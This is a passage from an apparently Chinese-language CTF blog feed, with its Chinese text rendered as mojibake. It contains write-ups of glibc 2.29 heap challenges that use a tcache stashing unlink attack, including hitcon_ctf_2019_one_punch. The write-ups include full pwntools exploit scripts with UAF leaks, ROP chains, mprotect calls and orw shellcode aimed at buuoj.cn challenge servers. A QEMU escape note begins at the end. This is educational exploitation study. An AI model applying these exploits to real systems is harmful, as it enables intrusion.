class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h4><p><img src="/../img/image-20221022100112620.png" alt="image-20221022100112620"></p><p><img src="/../img/image-20221022100136657.png" alt="image-20221022100136657"></p><h4 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h4><p><img src="/../img/image-20221022100147699.png" alt="image-20221022100147699"></p><p>å­˜åœ¨ä¸€ä¸ªUAFæ¼æ´</p><p>å­˜åœ¨ä¸€ä¸ªå¯ä»¥æº¢å‡ºçš„å‡½æ•°(å¦‚ä¸‹)</p><p><img src="/../img/image-20221022100158891.png" alt="image-20221022100158891"></p><p>è¿™é‡Œå¯ä»¥ç›´æ¥æº¢å‡ºbufæ‰“ä¸€ä¸ªæ ˆè¿ç§»ï¼Œè¿ç§»åˆ°å †ä¸Š(æå‰å¸ƒç½®ä¸€ä¸ªropé“¾)ï¼Œæ‰§è¡Œorwæ¥ç»•è¿‡æ²™ç®±ã€‚</p><h4 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h4><p>è™½ç„¶æœ‰UAFæ¼æ´å¹¶ä¸”æœ‰editå‡½æ•°å’Œshowå‡½æ•°ï¼Œä½†è¿™é¢˜æ²¡æ³•æ‰“tcache poisoningï¼Œå› ä¸ºè¿™é¢˜ç”³è¯·å†…å­˜çš„å‡½æ•°æ˜¯callocï¼Œè¿™ä¸ªå‡½æ•°çš„ç‰¹æ€§æ˜¯ä¸ä»tcache binä¸­å–å †å—ï¼Œå› æ­¤æˆ‘ä»¬æ‰“tcache poisoningä¹Ÿæ— æ³•ä»tcache biné“¾ä¸Šå–å‡ºæ¥å †å—ã€‚è€Œä¸”å°±ç®—èƒ½å–å‡ºæ¥å †å—ï¼Œä¹Ÿæ— æ³•ç»•è¿‡æ²™ç®±ã€‚æƒ³ç»•æ²™ç®±å°±å¿…é¡»å»åˆ©ç”¨é‚£ä¸ªæº¢å‡ºå‡½æ•°ã€‚</p><p>æº¢å‡ºå‡½æ•°ä¸­å­˜åœ¨ä¸€ä¸ªifæ£€æŸ¥ï¼Œè¿™é‡Œæœ¬æ¥ç”¨unsorted bin attackçš„è¯æ˜¯å¾ˆå¥½è¿‡æ£€æŸ¥çš„ï¼Œä½†æ˜¯åœ¨Libcä¸º2.29çš„ç‰ˆæœ¬ä¸­å¯¹unsorted binå¢åŠ äº†æ£€éªŒåŒå‘é“¾è¡¨å®Œæ•´æ€§ï¼Œæ— æ³•å»åˆ©ç”¨unsorted bin attack äº†ã€‚ä¸è¿‡åœ¨2.29æœ‰ä¸€ç§æ‰‹æ³•å¯ä»¥ä»£æ›¿unsorted bin attackè¾¾åˆ°ç±»ä¼¼çš„æ•ˆæœï¼Œä¹Ÿå°±æ˜¯tcache stashing unlink attack(ä¸Šæ–‡å¯¹tcache stashing unlink attackåšäº†ä»‹ç»ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†)</p><h4 id="æ³„éœ²åœ°å€ï¼š"><a href="#æ³„éœ²åœ°å€ï¼š" class="headerlink" title="æ³„éœ²åœ°å€ï¼š"></a>æ³„éœ²åœ°å€ï¼š</h4><p>å› ä¸ºå­˜åœ¨UAFæ¼æ´ï¼Œé…åˆshowå‡½æ•°ï¼Œå¯ä»¥è½»æ¾çš„æ³„éœ²å †åœ°å€å’Œlibcåœ°å€ã€‚ä½†æ˜¯ä¸ºäº†åç»­çš„åˆ©ç”¨ï¼Œæˆ‘ä»¬å‰æœŸéœ€è¦å…ˆä¼ªé€ ä¸¤æ¡ä¸åŒçš„tcacheé“¾(ä¸€æ¡ç”¨äºåç»­small binä¸­å †å—çš„é“¾å…¥ï¼Œä¸€æ¡ç”¨äºè®©å †å—è¿›å…¥unsorted binï¼Œå› ä¸º0x410è¿™æ¡é“¾è£…æ»¡äº†ï¼Œå†é‡Šæ”¾æ‰0x410çš„å †å—å°±ä¼šç›´æ¥è¿›å…¥unsorted bin) å¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬æ‰§è¡Œä¸¤æ¬¡showå‡½æ•°å³å¯è·å–libcåœ°å€å’Œå †åœ°å€ã€‚</p><p><img src="/../img/image-20221022100217107.png" alt="image-20221022100217107"></p><h4 id="æ”¾å…¥small-binä¸­ä¸¤ä¸ªå †å—"><a href="#æ”¾å…¥small-binä¸­ä¸¤ä¸ªå †å—" class="headerlink" title="æ”¾å…¥small binä¸­ä¸¤ä¸ªå †å—"></a>æ”¾å…¥small binä¸­ä¸¤ä¸ªå †å—</h4><p>ç›®å‰æˆ‘ä»¬åœ¨unsorted binä¸­æœ‰ä¸€ä¸ª0x410çš„å †å—ï¼Œæˆ‘ä»¬å…ˆå»ç”³è¯·ä¸€ä¸ª0x300çš„å †å—ï¼Œè¿™æ ·å‰©ä¸‹çš„0x100å°±ä¼šè¿›å…¥unsorted binä¸­ï¼Œç„¶åä¸‹ä¸€æ¬¡ç”³è¯·0x400çš„å †å—ï¼Œptmallocå°±ä¼šå»éå†unsorted binå°†åŸå…ˆ0x100çš„å †å—æ”¾å…¥small binä¸­ã€‚æ¥ç€å¦‚æ³•ç‚®åˆ¶å†ç”³è¯·ä¸€ä¸ª0x400çš„å †å—ï¼Œé‡Šæ”¾æ‰è¿›å…¥unsorted binï¼Œç„¶åç”³è¯·0x300å †å—ï¼Œå°†unsorted binä¸­çš„å †å—è¿›è¡Œåˆ‡å‰²ï¼Œæ®‹ç•™çš„0x100å †å—è¿”å›unsorted bin,æœ€åå†ç”³è¯·ä¸€ä¸ªä¸ç­‰äº0x100çš„å †å—(å¦‚æœæ­£å¥½ç›¸ç­‰çš„è¯ï¼Œå°±ç›´æ¥ä»unsorted biné‡Œæ‹¿å‡ºæ¥äº†ï¼Œåªæœ‰ä¸ç›¸ç­‰æ‰ä¼šå»éå†ï¼Œç„¶åç»™chunkåˆ†ç±»)ï¼Œè¿™æ—¶å€™å°±åˆæŠŠ0x100çš„å †å—æ”¾å…¥åˆ°äº†small biné‡Œï¼Œè€Œæ­¤æ—¶small binä¸­å°±æœ‰ä¸¤ä¸ªå †å—äº†ã€‚</p><h4 id="ç¯¡æ”¹small-binä¸­çš„bkæŒ‡é’ˆ"><a href="#ç¯¡æ”¹small-binä¸­çš„bkæŒ‡é’ˆ" class="headerlink" title="ç¯¡æ”¹small binä¸­çš„bkæŒ‡é’ˆ"></a>ç¯¡æ”¹small binä¸­çš„bkæŒ‡é’ˆ</h4><p>å› ä¸ºè¿™é“é¢˜è¦è§¦å‘åé—¨çš„è¯ï¼Œå°±å¾—è®©ä¸‹é¢è¿™ä¸ªifæˆç«‹ï¼Œæˆ‘ä»¬ç›´æ¥ç¯¡æ”¹small binçš„bkæŒ‡é’ˆä¸ºè¿™ä¸ªqword_4058+2048-0x10çš„å€¼å³å¯</p><p><img src="/../img/image-20221022100228422.png" alt="image-20221022100228422"></p><p>ç¯¡æ”¹åsmall binçš„æƒ…å†µå¦‚ä¸‹</p><p><img src="/../img/image-20221022100244186.png" alt="image-20221022100244186"></p><p>æœ€åå†ç”³è¯·ä¸€ä¸ª0xf0çš„å †å—å³å¯è§¦å‘tcache stashing unlink attackã€‚</p><p>å®Œäº‹äº†åˆ©ç”¨åé—¨ï¼Œæ‰“ä¸€ä¸ªæ ˆè¿ç§»ï¼Œè¿ç§»æ‰§è¡Œæµåˆ°å †ä¸Šï¼Œæ‰§è¡Œæå‰å¸ƒç½®å¥½çš„ropé“¾æ‰§è¡Œorwå³å¯ã€‚æˆ‘æ˜¯ç›´æ¥è°ƒç”¨äº†mprotectå‡½æ•°è®©å †å»å˜æˆå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç„¶åç›´æ¥æ‰§è¡Œorwçš„shellcode(è¿™é‡Œæ²¡æœ‰éš¾ç‚¹ï¼Œå°±ä¸å†å…·ä½“é˜è¿°äº†)</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><p><a href="https://zikh26.github.io/posts/ad411136.html">tools-å‡½æ•°åº“ | ZIKH26â€™s Blog</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">d_e=<span class="number">0x19A2</span></span><br><span class="line">d_d=<span class="number">0x1991</span></span><br><span class="line">d_a=<span class="number">0x196E</span></span><br><span class="line">d_s=<span class="number">0x19B3</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25200&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/home/zikh/Desktop/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so&quot;)</span></span><br><span class="line"><span class="comment"># p=remote(&quot;node4.buuoj.cn&quot;,25200)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,choice,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): &quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(i,<span class="number">2</span>,<span class="string">&#x27;wow&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#prevent merge with top chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1e4ca0</span><span class="comment">#recv_libc()-0x1e4ca0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">4</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x0000000000026542</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x0000000000026f9e</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x000000000012bda6</span></span><br><span class="line">rop=p64(pop_rdi)+p64((leak_heap&gt;&gt;<span class="number">12</span>)*<span class="number">0x1000</span>)</span><br><span class="line">rop+=p64(pop_rsi)+p64(<span class="number">0x4000</span>)</span><br><span class="line">rop+=p64(pop_rdx)+p64(<span class="number">7</span>)</span><br><span class="line">rop+=p64(libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]+libc_base)</span><br><span class="line">rop+=p64(leak_heap+<span class="number">0x13b0</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x48\xC7\xC0\x03\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x0F\x05\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x00\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">rop+=shellcode</span><br><span class="line">add(<span class="number">12</span>,<span class="number">4</span>,rop)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_e,d_s,d_d,<span class="number">0x143C</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target_addr=leak_heap-<span class="number">0x2270</span></span><br><span class="line">log_addr(<span class="string">&#x27;target_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x300</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(leak_heap+<span class="number">0xb20</span>)+p64(target_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>,<span class="number">2</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(leak_heap+<span class="number">0x1370</span>-<span class="number">8</span>)+p64(<span class="number">0x0000000000058373</span>+libc_base)</span><br><span class="line">p.sendafter(<span class="string">&quot;What do you want to say?&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221022100258683.png" alt="image-20221022100258683"></p><h3 id="hitcon-ctf-2019-one-punch"><a href="#hitcon-ctf-2019-one-punch" class="headerlink" title="hitcon_ctf_2019_one_punch"></a>hitcon_ctf_2019_one_punch</h3><h4 id="ä¿æŠ¤ç­–ç•¥ï¼š-1"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h4><img src="../img/image-20221026213251795.png" alt="image-20221026213251795" style="zoom:50%;" /><img src="../img/image-20221026213527448.png" alt="image-20221026213527448" style="zoom:50%;" /><h4 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h4><p>è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯tcache stashing unlink attackï¼Œä¸è¿‡ç”±äºæœ¬é¢˜å¼€äº†æ²™ç®±ï¼Œæ‰€ä»¥æœ€åéœ€è¦ç”¨orwè·å–flagã€‚</p><p>ç¨‹åºç»™äº†ä¸ªåé—¨(å¯ä»¥è°ƒç”¨mallocï¼Œç¯¡æ”¹malloc_hookåŠ«æŒæ‰§è¡Œæµ)ï¼Œä¸è¿‡éœ€è¦ç”¨tcache stashing unlink attackæ¥è§¦å‘è¿™ä¸ªåé—¨ï¼Œåˆ©ç”¨libcé‡Œçš„ä¸€ä¸ªgadget(add rsp,0x48;ret)å°†å…¶å†™åˆ°malloc_hooké‡Œï¼Œç›´æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚</p><p>åˆ©ç”¨é‚£ä¸ªgadgetèƒ½æ§åˆ¶æ‰§è¡Œæµçš„åŸå› æ˜¯å› ä¸ºç¨‹åºè¯¢é—®sizeçš„æ—¶å€™ï¼Œè¾“å…¥åˆ°æ ˆé‡Œçš„æ•°æ®å¤ªå¤§äº†ã€‚(å¦‚ä¸‹)</p><p><img src="/../img/image-20221026220856636.png" alt="image-20221026220856636"></p><h4 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26802&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;hero name: &quot;</span>,content*size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;hero name: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">0xC388</span>))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_chain</span>():</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x400</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0</span>,<span class="number">0x400</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>():</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc_base=recv_libc()-<span class="number">0x1e4ca0</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;hero name: &#x27;</span>)</span><br><span class="line">    leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> libc_base,leak_heap</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_into_smallbin</span>():</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x1</span>,shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>).ljust(<span class="number">0x2f0</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x300</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#first get into small bin</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x300</span>,<span class="string">&#x27;f&#x27;</span>)<span class="comment">#prevent merged chunk</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x2f0</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x300</span>,<span class="string">&#x27;g&#x27;</span>)<span class="comment">#second get into small bin</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tcache_stashing_unlink_attack</span>(<span class="params">leak_heap,libc_base</span>):</span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    add_rsp_ret=<span class="number">0x000000000008cfd6</span>+libc_base</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x210</span>,<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x210</span>,<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;o&#x27;</span>*<span class="number">0x2f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(leak_heap-<span class="number">0x560</span>)+p64(leak_heap-<span class="number">0x26f0</span>-<span class="number">0x10</span>-<span class="number">5</span>)</span><br><span class="line">    edit(<span class="number">1</span>,payload)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">2</span>,p64(malloc_hook))</span><br><span class="line">    backdoor(shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>))</span><br><span class="line">    backdoor(p64(add_rsp_ret))</span><br><span class="line">    pop_rdi=libc_base+<span class="number">0x0000000000026542</span></span><br><span class="line">    pop_rsi=libc_base+<span class="number">0x0000000000026f9e</span></span><br><span class="line">    pop_rdx=libc_base+<span class="number">0x000000000012bda6</span></span><br><span class="line">    open_addr=libc_base+<span class="number">0x000000000010cc80</span></span><br><span class="line">    read_addr=libc_base+<span class="number">0x000000000010cf70</span></span><br><span class="line">    write_addr=libc_base+<span class="number">0x000000000010d010</span></span><br><span class="line">    flag_addr=libc_base+<span class="number">0x0000000000016239</span></span><br><span class="line">    syscall_addr=libc_base+<span class="number">0x0000000000026bd4</span></span><br><span class="line">    pop_rax=libc_base+<span class="number">0x0000000000047cf8</span></span><br><span class="line">    mprotect_addr=libc_base+<span class="number">0x0000000000117590</span></span><br><span class="line">    </span><br><span class="line">    rop=p64(pop_rdi)+p64((leak_heap&gt;&gt;<span class="number">12</span>)*<span class="number">0x1000</span>)</span><br><span class="line">    rop+=p64(pop_rsi)+p64(<span class="number">0x4000</span>)</span><br><span class="line">    rop+=p64(pop_rdx)+p64(<span class="number">7</span>)</span><br><span class="line">    rop+=p64(mprotect_addr)</span><br><span class="line">    rop+=p64(leak_heap+<span class="number">0x1180</span>)</span><br><span class="line">    rop+=p64(<span class="number">0xdeadbeef</span>)*<span class="number">20</span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x16DE</span>,<span class="number">0x16ea</span>,<span class="number">0x16f6</span>,<span class="number">0x1702</span>,<span class="number">0x15C3</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">1</span>,rop)</span><br><span class="line">    </span><br><span class="line">create_chain()</span><br><span class="line">libc_base,leak_heap=leak_addr()</span><br><span class="line">get_into_smallbin()</span><br><span class="line">tcache_stashing_unlink_attack(leak_heap,libc_base)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221026221010006.png" alt="image-20221026221010006"></p><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><p><a href="https://www.anquanke.com/post/id/198173?display=mobile#h2-0">Tcache Stashing Unlink Attackåˆ©ç”¨æ€è·¯-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p><a href="https://blog.csdn.net/weixin_46521144/article/details/119536209">https://blog.csdn.net/weixin_46521144/article/details/119536209</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tcache stashing unlink attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºqemué€ƒé€¸çš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/fabe43ff.html"/>
      <url>/posts/fabe43ff.html</url>
      
        <content type="html"><![CDATA[<p>å‰ä¸€æ®µ <code>VNCTF 2023</code> æ­£å¥½æœ‰ä¸€é“éå¸¸å…¥é—¨ <code>qemu</code> é€ƒé€¸çš„é¢˜ç›®ï¼Œæ­£å¥½ä»¥æ­¤ä¸ºå¥‘æœºè¿›è¡Œ <code>qemu</code> é€ƒé€¸çš„å…¥é—¨å­¦ä¹ ï¼Œåœ¨è¿™éƒ¨åˆ†çš„å­¦ä¹ ä¸­ï¼Œè¦æ„Ÿè°¢ <strong>winmt</strong> å’Œ <strong>roderick</strong> å¸ˆå‚…è§£ç­”æˆ‘çš„ä¸€äº›å›°æƒ‘ã€‚</p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="QEMUä¸é€ƒé€¸"><a href="#QEMUä¸é€ƒé€¸" class="headerlink" title="QEMUä¸é€ƒé€¸"></a>QEMUä¸é€ƒé€¸</h3><p><code>QEMU</code> æ˜¯çº¯è½¯ä»¶å®ç°çš„è™šæ‹ŸåŒ–<strong>æ¨¡æ‹Ÿå™¨</strong>ï¼Œå¯ä»¥æ¨¡æ‹Ÿå¤šç§ä¸åŒçš„è®¡ç®—æœºç³»ç»Ÿå’Œç¡¬ä»¶è®¾å¤‡ã€‚è™½ç„¶ <code>QEMU</code> å¯ä»¥æ¨¡æ‹Ÿå‡ºç¡¬ä»¶æˆ–è™šæ‹Ÿç¯å¢ƒï¼Œä½†å®ƒæœ¬è´¨ä¸Šåªæ˜¯ä¸€ä¸ªç¨‹åºï¼Œæ‰€è°“ <code>qemu</code> é€ƒé€¸æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨ <code>QEMU</code> å®ç°çš„æœ‰æ¼æ´çš„ <code>PCI</code> è®¾å¤‡æ¥è·å–ä¸»æœºçš„æƒé™ã€‚ä»è™šæ‹Ÿæœºä¸­ 